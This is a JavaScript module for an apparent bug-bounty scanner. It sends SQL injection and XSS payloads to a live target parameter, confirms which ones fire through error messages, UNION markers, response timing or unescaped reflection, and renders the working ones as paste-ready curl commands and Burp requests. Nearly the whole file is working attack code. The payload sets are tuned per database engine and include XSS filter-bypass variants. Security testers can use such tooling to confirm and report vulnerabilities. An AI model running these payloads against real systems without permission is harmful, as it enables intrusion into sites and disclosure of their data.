/**
 * Bug-bounty payload generator for SQLi and XSS findings.
 *
 * This version LIVE-TESTS each candidate payload against the target and only
 * marks the ones that actually fire as "working". The output pack is ranked
 * so the top entries are proven-to-work payloads you can paste straight into
 * a bounty report, each with a curl one-liner and a raw HTTP request block
 * for Burp Repeater.
 *
 * Non-destructive: read-only SQL (version/current_user/substr), alert(1) XSS
 * PoC only, sleeps capped at 5s, no third-party beacons, no DROP/UPDATE/DELETE.
 */

import { URL } from "node:url";

const UA = "YORU-DeepScan/2.0 (+payload-gen)";
const TIMEOUT_MS = 12_000;
const MAX_BODY = 200_000;
const MAX_TESTS_PER_FINDING = 24;

const clamp = (s, n = 400) => String(s || "").slice(0, n);

/* ─────────── low-level HTTP ─────────── */

async function fetchRaw(url, init = {}) {
  const method = (init.method || "GET").toUpperCase();
  const headers = { "user-agent": UA, accept: "*/*", ...(init.headers || {}) };
  const t0 = Date.now();
  let res, body = "", err = null;
  try {
    res = await fetch(url, {
      method, headers, body: init.body,
      redirect: init.redirect || "follow",
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    const buf = await res.arrayBuffer();
    body = Buffer.from(buf).slice(0, MAX_BODY).toString("utf8");
  } catch (e) { err = e.message; }
  const timeMs = Date.now() - t0;
  return { res, body, timeMs, err, status: res?.status || 0 };
}

function replaceParam(url, key, value) {
  const u = new URL(url); u.searchParams.set(key, value); return u.toString();
}

function curlFor(url, payload, param) {
  const u = new URL(url);
  u.searchParams.set(param, payload);
  return `curl -sk -A '${UA}' '${u.toString().replace(/'/g, "'\\''")}'`;
}

function rawRequestFor(url, payload, param) {
  const u = new URL(url);
  u.searchParams.set(param, payload);
  return [
    `GET ${u.pathname}${u.search} HTTP/1.1`,
    `Host: ${u.host}`,
    `User-Agent: ${UA}`,
    `Accept: */*`,
    ``, ``,
  ].join("\n");
}

/* ─────────── context detection ─────────── */

function detectDbFlavour(finding, proof) {
  const hay = `${finding.evidence || ""}\n${proof?.evidence || ""}\n${proof?.response || ""}`.toLowerCase();
  if (/mysql|mariadb|you have an error in your sql syntax/.test(hay)) return "mysql";
  if (/postgres|pg_|pgsql|syntax error at or near/.test(hay)) return "postgres";
  if (/microsoft sql|mssql|sql server|unclosed quotation mark/.test(hay)) return "mssql";
  if (/sqlite/.test(hay)) return "sqlite";
  if (/ora-\d{4,5}|oracle/.test(hay)) return "oracle";
  return "generic";
}

const SQL_ERROR_RX = [
  /you have an error in your sql syntax/i, /warning:\s*mysql/i,
  /unclosed quotation mark/i, /pg_query|PostgreSQL query failed/i,
  /sqlite3?::(?:exception|error)/i, /ORA-\d{5}/i,
  /System\.Data\.SqlClient\.SqlException/i, /SQLSTATE\[/i,
];

/* ─────────── SQLi payload sets ─────────── */

function sqliCandidates(flavour, origValue) {
  const base = origValue || "1";
  const q = "'";
  const common = [
    { label: "Single-quote error probe",   payload: `${base}${q}`,                       kind: "error" },
    { label: "Quote + comment",            payload: `${base}${q}-- -`,                   kind: "error" },
    { label: "Boolean TRUE (string)",      payload: `${base}${q} OR ${q}1${q}=${q}1`,    kind: "boolean-true" },
    { label: "Boolean FALSE (string)",     payload: `${base}${q} OR ${q}1${q}=${q}2`,    kind: "boolean-false" },
    { label: "Boolean TRUE (numeric)",     payload: `${base} OR 1=1-- -`,                kind: "boolean-true" },
    { label: "Boolean FALSE (numeric)",    payload: `${base} AND 1=2-- -`,               kind: "boolean-false" },
    { label: "Paren break",                payload: `${base}${q}) OR (${q}1${q}=${q}1-- -`, kind: "error" },
  ];
  const byDb = {
    mysql: [
      { label: "MySQL version (UNION)",    payload: `${base}${q} UNION SELECT NULL,version(),NULL-- -`, kind: "union", marker: /\d+\.\d+\.\d+/ },
      { label: "MySQL user (UNION)",       payload: `${base}${q} UNION SELECT NULL,current_user(),NULL-- -`, kind: "union", marker: /@/ },
      { label: "MySQL error (EXTRACTVALUE)", payload: `${base}${q} AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -`, kind: "error", marker: /XPATH|extractvalue/i },
      { label: "MySQL time (SLEEP 5)",     payload: `${base}${q} OR SLEEP(5)-- -`,       kind: "time" },
      { label: "MySQL time (IF SLEEP)",    payload: `${base}${q} OR IF(1=1,SLEEP(5),0)-- -`, kind: "time" },
    ],
    postgres: [
      { label: "PG version (UNION)",       payload: `${base}${q} UNION SELECT NULL,version(),NULL-- -`, kind: "union", marker: /PostgreSQL/i },
      { label: "PG user (UNION)",          payload: `${base}${q} UNION SELECT NULL,current_user,NULL-- -`, kind: "union" },
      { label: "PG time (pg_sleep 5)",     payload: `${base}${q}; SELECT pg_sleep(5)-- -`, kind: "time" },
      { label: "PG error (CAST)",          payload: `${base}${q} AND 1=CAST(version() AS int)-- -`, kind: "error", marker: /invalid input syntax|PostgreSQL/i },
    ],
    mssql: [
      { label: "MSSQL version (UNION)",    payload: `${base}${q} UNION SELECT NULL,@@version,NULL-- -`, kind: "union", marker: /Microsoft SQL/i },
      { label: "MSSQL time (WAITFOR)",     payload: `${base}${q}; WAITFOR DELAY '0:0:5'-- -`, kind: "time" },
      { label: "MSSQL error (CONVERT)",    payload: `${base}${q} AND 1=CONVERT(int,@@version)-- -`, kind: "error", marker: /Microsoft|SqlException/i },
    ],
    sqlite: [
      { label: "SQLite version (UNION)",   payload: `${base}${q} UNION SELECT NULL,sqlite_version(),NULL-- -`, kind: "union", marker: /\d+\.\d+\.\d+/ },
      { label: "SQLite time",              payload: `${base}${q} AND 1=randomblob(100000000)-- -`, kind: "time" },
    ],
    oracle: [
      { label: "Oracle version (UNION)",   payload: `${base}${q} UNION SELECT NULL,banner,NULL FROM v$version-- -`, kind: "union", marker: /Oracle/i },
      { label: "Oracle time",              payload: `${base}${q} AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -`, kind: "time" },
    ],
    generic: [
      { label: "UNION @@version",          payload: `${base}${q} UNION SELECT NULL,@@version,NULL-- -`, kind: "union", marker: /\d+\.\d+/ },
      { label: "Sleep 5",                  payload: `${base}${q} OR SLEEP(5)-- -`,       kind: "time" },
    ],
  };
  return [...common, ...(byDb[flavour] || byDb.generic)];
}

/* Test a SQLi candidate. Returns { works, why } */
async function testSqli(candidate, { url, param, baseline, baselineFalse }) {
  const test = await fetchRaw(replaceParam(url, param, candidate.payload));
  if (candidate.kind === "error") {
    const hit = SQL_ERROR_RX.find((rx) => rx.test(test.body));
    if (hit) return { works: true, why: `SQL error: ${test.body.match(hit)[0].slice(0, 120)}` };
  }
  if (candidate.kind === "boolean-true") {
    if (baseline && Math.abs(test.body.length - baseline.body.length) < 50) return { works: true, why: `Response matches TRUE baseline (${test.body.length}B ~ ${baseline.body.length}B)` };
  }
  if (candidate.kind === "boolean-false") {
    if (baseline && baselineFalse && Math.abs(test.body.length - baselineFalse.body.length) < 50 && Math.abs(test.body.length - baseline.body.length) > 100) {
      return { works: true, why: `Response matches FALSE baseline and differs from TRUE (${test.body.length}B)` };
    }
  }
  if (candidate.kind === "union") {
    if (candidate.marker && candidate.marker.test(test.body)) return { works: true, why: `UNION marker matched (${(test.body.match(candidate.marker) || [""])[0].slice(0, 80)})` };
  }
  if (candidate.kind === "time") {
    if (test.timeMs >= 4500 && test.timeMs < 11000) return { works: true, why: `Response delayed ${test.timeMs}ms (~5s payload)` };
  }
  return { works: false, why: `no signal (HTTP ${test.status}, ${test.body.length}B, ${test.timeMs}ms)` };
}

async function verifySqliPack(finding, proof) {
  const url = finding.url, param = finding.param;
  const flavour = detectDbFlavour(finding, proof);
  if (!url || !param) return { flavour, tested: false, ranked: sqliCandidates(flavour, "1").map(c => ({ ...c, works: null, why: "no url/param — untested" })) };

  const origValue = new URL(url).searchParams.get(param) || "1";
  // baselines for boolean differential
  const [baseline, baselineFalse] = await Promise.all([
    fetchRaw(replaceParam(url, param, `${origValue}' OR '1'='1`)),
    fetchRaw(replaceParam(url, param, `${origValue}' AND '1'='2`)),
  ]);

  const candidates = sqliCandidates(flavour, origValue).slice(0, MAX_TESTS_PER_FINDING);
  const tested = [];
  for (const c of candidates) {
    try {
      const r = await testSqli(c, { url, param, baseline, baselineFalse });
      tested.push({ ...c, works: r.works, why: r.why });
    } catch (e) { tested.push({ ...c, works: false, why: `error: ${e.message}` }); }
  }
  // Rank: working first, then by kind priority
  const prio = { union: 1, error: 2, "boolean-true": 3, "boolean-false": 4, time: 5 };
  tested.sort((a, b) => Number(!!b.works) - Number(!!a.works) || (prio[a.kind] || 9) - (prio[b.kind] || 9));
  return { flavour, tested: true, ranked: tested };
}

/* ─────────── XSS payload sets ─────────── */

function xssCandidates(marker) {
  return [
    { label: "SVG onload (HTML context)",       payload: `<svg/onload=alert(1)>${marker}`,               ctx: "html" },
    { label: "Classic script tag",               payload: `<script>alert(1)</script>${marker}`,           ctx: "html" },
    { label: "IMG onerror",                      payload: `<img src=x onerror=alert(1)>${marker}`,        ctx: "html" },
    { label: "Attribute break + handler",        payload: `"><svg/onload=alert(1)>${marker}`,             ctx: "attribute" },
    { label: "Single-quote attribute break",     payload: `'><svg/onload=alert(1)>${marker}`,             ctx: "attribute" },
    { label: "Autofocus onfocus",                payload: `" autofocus onfocus=alert(1) x="${marker}`,    ctx: "attribute" },
    { label: "Script-string break (double)",     payload: `";alert(1);//${marker}`,                       ctx: "script" },
    { label: "Script-string break (single)",     payload: `';alert(1);//${marker}`,                       ctx: "script" },
    { label: "Close-script pivot",               payload: `</script><script>alert(1)</script>${marker}`,  ctx: "script" },
    { label: "javascript: URI",                  payload: `javascript:alert(1)//${marker}`,               ctx: "href" },
    { label: "Case variant bypass",              payload: `<ScRiPt>alert(1)</ScRiPt>${marker}`,           ctx: "html" },
    { label: "Nested-tag strip bypass",          payload: `<scr<script>ipt>alert(1)</scr</script>ipt>${marker}`, ctx: "html" },
    { label: "HTML-entity bypass",               payload: `&#60;svg/onload=alert(1)&#62;${marker}`,       ctx: "html" },
    { label: "Backtick template",                payload: "`;alert(1);//" + marker,                       ctx: "script" },
    { label: "Details ontoggle",                 payload: `<details open ontoggle=alert(1)>${marker}`,    ctx: "html" },
  ];
}

function classifyReflection(body, marker) {
  if (!body.includes(marker)) return { reflected: false };
  const idx = body.indexOf(marker);
  const around = body.slice(Math.max(0, idx - 120), idx + marker.length + 40);
  let context = "html";
  if (/<script[\s\S]{0,200}$/i.test(body.slice(Math.max(0, idx - 200), idx))) context = "script";
  else if (/=\s*["'][^"'<>]*$/.test(body.slice(Math.max(0, idx - 80), idx))) context = "attribute";
  else if (/href\s*=\s*["']?[^"'<>]*$/i.test(body.slice(Math.max(0, idx - 80), idx))) context = "href";
  const escaped = /&lt;|&#60;|\\u003c/.test(around);
  return { reflected: true, context, escaped, snippet: around };
}

async function testXss(candidate, { url, param, marker }) {
  const r = await fetchRaw(replaceParam(url, param, candidate.payload));
  const cls = classifyReflection(r.body, marker);
  if (!cls.reflected) return { works: false, why: `no reflection (HTTP ${r.status})` };
  if (cls.escaped) return { works: false, why: `reflected but HTML-escaped (${cls.context} ctx)` };
  // Payload structure must be intact — check for the tell-tale piece
  const tell = /onload=|onerror=|onfocus=|<script|ontoggle=|javascript:/i;
  const raw = r.body.slice(Math.max(0, r.body.indexOf(marker) - 200), r.body.indexOf(marker) + marker.length + 20);
  if (!tell.test(raw)) return { works: false, why: `reflected in ${cls.context} but payload structure filtered` };
  const ctxOk = candidate.ctx === cls.context || candidate.ctx === "html";
  return {
    works: true,
    why: `payload reflected verbatim in ${cls.context} context${ctxOk ? "" : " (candidate targets " + candidate.ctx + ")"}`,
    context: cls.context,
  };
}

async function verifyXssPack(finding, proof) {
  const url = finding.url, param = finding.param;
  if (!url || !param) return { tested: false, ranked: xssCandidates("YORUXSS").map(c => ({ ...c, works: null, why: "no url/param — untested" })) };
  const marker = "yr" + Math.random().toString(36).slice(2, 7);
  const candidates = xssCandidates(marker).slice(0, MAX_TESTS_PER_FINDING);
  const tested = [];
  for (const c of candidates) {
    try {
      const r = await testXss(c, { url, param, marker });
      tested.push({ ...c, works: r.works, why: r.why, observedContext: r.context });
    } catch (e) { tested.push({ ...c, works: false, why: `error: ${e.message}` }); }
  }
  tested.sort((a, b) => Number(!!b.works) - Number(!!a.works));
  return { tested: true, ranked: tested, marker };
}

/* ─────────── render ─────────── */

function renderPack(kind, ranked, meta, finding) {
  const workingCount = ranked.filter(p => p.works === true).length;
  const url = finding.url;
  const param = finding.param;
  const lines = [];
  lines.push(`## Ready-to-use payloads (${kind})`);
  lines.push("");
  const bits = [];
  if (meta.flavour) bits.push(`DB: **${meta.flavour}**`);
  if (param) bits.push(`param: \`${param}\``);
  if (url) bits.push(`url: ${url}`);
  if (meta.tested) bits.push(`live-tested: **${workingCount}/${ranked.length} working**`);
  else bits.push(`_not live-tested (missing url/param)_`);
  lines.push(bits.join(" · "));
  lines.push("");
  lines.push("> Non-destructive: read-only SQL, `alert(1)` PoC, sleeps ≤5s, no third-party beacons.");
  lines.push("");

  const working = ranked.filter(p => p.works === true);
  const failed = ranked.filter(p => p.works === false);
  const untested = ranked.filter(p => p.works === null);

  if (working.length) {
    lines.push(`### ✓ Verified working (${working.length})`);
    lines.push("");
    for (const p of working) {
      lines.push(`#### ${p.label}`);
      lines.push(`- **why it fires:** ${p.why}`);
      lines.push("- **payload:**");
      lines.push("  ```");
      lines.push("  " + clamp(p.payload));
      lines.push("  ```");
      if (url && param) {
        lines.push("- **curl:**");
        lines.push("  ```bash");
        lines.push("  " + curlFor(url, p.payload, param));
        lines.push("  ```");
        lines.push("- **raw request (Burp Repeater):**");
        lines.push("  ```http");
        rawRequestFor(url, p.payload, param).split("\n").forEach(l => lines.push("  " + l));
        lines.push("  ```");
      }
      lines.push("");
    }
  } else if (meta.tested) {
    lines.push(`### ✗ No candidate fired against the live target`);
    lines.push("");
    lines.push("The scanner flagged a signal but none of the payloads below reproduced it on re-test. The target may filter or normalize input; try manually with Burp intruder using these as a base.");
    lines.push("");
  }

  if (failed.length) {
    lines.push(`### Additional candidates (not confirmed on re-test)`);
    lines.push("");
    for (const p of failed) lines.push(`- **${p.label}** — \`${clamp(p.payload)}\`  _(${p.why})_`);
    lines.push("");
  }
  if (untested.length) {
    lines.push(`### Candidate list (not tested)`);
    lines.push("");
    for (const p of untested) lines.push(`- **${p.label}** — \`${clamp(p.payload)}\``);
    lines.push("");
  }
  return lines.join("\n");
}

/**
 * Build a markdown "Ready-to-use payloads" section + a plain-text payload
 * dump for the finding. Live-tests each candidate against the target so the
 * working set is proven, not speculative.
 *
 * @returns {Promise<null | { markdown: string, plain: string, payloads: string[], workingCount: number }>}
 */
export async function generatePayloadsFor(finding, proof) {
  const t = finding.type || "";
  if (/^sqli/.test(t)) {
    const { flavour, tested, ranked } = await verifySqliPack(finding, proof);
    const md = renderPack("SQLi", ranked, { flavour, tested }, finding);
    const workingCount = ranked.filter(p => p.works === true).length;
    const plain = ranked.map(p => `# ${p.label}${p.works === true ? " [WORKING]" : p.works === false ? " [failed]" : ""}${p.why ? "\n# " + p.why : ""}\n${p.payload}`).join("\n\n");
    return { markdown: md, plain, payloads: ranked.map(p => p.payload), workingCount };
  }
  if (/^xss/.test(t)) {
    const { tested, ranked } = await verifyXssPack(finding, proof);
    const md = renderPack("XSS", ranked, { tested }, finding);
    const workingCount = ranked.filter(p => p.works === true).length;
    const plain = ranked.map(p => `# ${p.label}${p.works === true ? " [WORKING]" : p.works === false ? " [failed]" : ""}${p.why ? "\n# " + p.why : ""}\n${p.payload}`).join("\n\n");
    return { markdown: md, plain, payloads: ranked.map(p => p.payload), workingCount };
  }
  return null;
}
